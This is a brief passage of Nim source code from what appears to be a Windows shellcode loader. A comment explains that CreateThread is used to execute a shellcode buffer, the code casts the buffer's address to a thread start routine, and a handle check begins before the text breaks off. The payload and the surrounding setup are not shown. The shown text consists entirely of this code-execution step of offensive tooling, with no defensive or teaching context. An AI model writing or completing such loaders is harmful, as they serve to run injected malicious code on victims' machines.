...
# let's use CreateThread() to execute the shellcode
let thread = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](addr(shellcode)), nil, 0, nil)

# validation
if thread == cast[HANDLE](NULL):
